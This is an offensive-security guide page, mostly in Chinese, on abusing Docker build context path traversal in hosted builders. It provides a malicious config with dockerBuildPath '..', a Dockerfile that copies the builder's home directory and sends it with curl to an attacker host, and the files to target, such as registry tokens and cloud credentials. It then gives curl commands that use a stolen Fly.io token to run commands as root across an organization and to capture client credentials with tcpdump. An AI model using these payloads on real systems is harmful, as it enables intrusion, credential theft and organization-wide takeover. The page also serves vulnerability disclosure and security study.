# 滥用 Docker Build Context 在 托管 构建器 (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

如果 CI/CD 平台或托管 builder 允许贡献者指定 Docker build context 路径和 Dockerfile 路径，通常可以将 context 设置为父目录（例如 ".."），使主机文件成为构建上下文的一部分。然后，攻击者控制的 Dockerfile 可以 COPY 并外泄位于 builder 用户主目录的秘密（例如 ~/.docker/config.json）。被盗的 registry tokens 也可能对提供商的 control-plane APIs 生效，从而实现组织范围的 RCE。

## 攻击面

许多托管 builder/registry 服务在构建用户提交的镜像时大致执行以下操作：
- 读取包含以下内容的 repo 级别配置：
  - build context path (sent to the Docker daemon)
  - Dockerfile path relative to that context
- 将指定的 build context 目录和 Dockerfile 复制到 Docker daemon
- 构建镜像并将其作为托管服务运行

如果平台没有对 build context 进行规范化和限制，用户可以将其设置为仓库之外的位置（path traversal），导致构建用户可读的任意主机文件成为构建上下文的一部分，并可在 Dockerfile 中通过 COPY 访问。

常见的实际约束：
- Dockerfile 必须位于所选的 context 路径内，并且其路径必须事先已知。
- build user 必须对包含在 context 中的文件具有读取权限；特殊设备文件可能会破坏复制过程。

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
注意：
- 使用 '..' 通常会解析到 builder 用户的主目录（例如 /home/builder），该目录通常包含敏感文件。
- 将 Dockerfile 放在仓库的目录名下（例如，repo "test" → test/Dockerfile），以便它保持在展开的父上下文内。

## PoC: Dockerfile to ingest and exfiltrate the host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
通常从 $HOME 恢复的目标：
- ~/.docker/config.json (registry auths/tokens)
- 其他 cloud/CLI 缓存和配置（例如 ~/.fly, ~/.kube, ~/.aws, ~/.config/*）

提示：即使仓库中包含 .dockerignore，易受攻击的平台端 context selection 仍然决定发送到 daemon 的内容。如果平台在评估你仓库的 .dockerignore 之前将所选路径复制到 daemon，主机文件仍可能被暴露。

## 使用过度权限 tokens 进行 Cloud pivot（示例：Fly.io Machines API）

某些平台会颁发一个可同时用于 container registry 和 control-plane API 的 bearer token。如果你 exfiltrate 了一个 registry token，尝试用它访问 provider 的 API。

使用从 ~/.docker/config.json 获取的被盗 token 对 Fly.io Machines API 发起的示例 API 调用：

列举组织中的 apps：
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
在任意 app 的任何机器内以 root 身份运行命令：
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
结果：在 token 拥有足够权限的情况下，可对所有托管应用实现整个组织范围的 remote code execution。

## 从被攻陷的托管服务窃取 Secret

在对托管服务器取得 exec/RCE 后，你可以窃取 client-supplied secrets (API keys, tokens) 或发起 prompt-injection 攻击。示例：安装 tcpdump 并在端口 8080 捕获 HTTP 流量以提取 inbound credentials。
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
捕获的请求通常在 headers、bodies 或 query params 中包含客户端凭证。

## 参考资料

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
